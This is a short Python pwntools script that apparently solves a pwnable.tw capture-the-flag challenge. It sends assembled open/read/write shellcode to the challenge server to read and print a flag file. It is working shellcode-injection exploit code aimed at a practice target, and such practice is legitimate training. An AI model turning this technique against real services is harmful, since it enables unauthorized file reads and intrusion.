#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('chall.pwnable.tw', 10001)

x = shellcraft.open('/home/orw/flag')
x += shellcraft.read('eax', 'ebp', 100)
x += shellcraft.write(1, 'ebp', 100)
r.send(asm(x))

print r.recvrepeat(0.2)
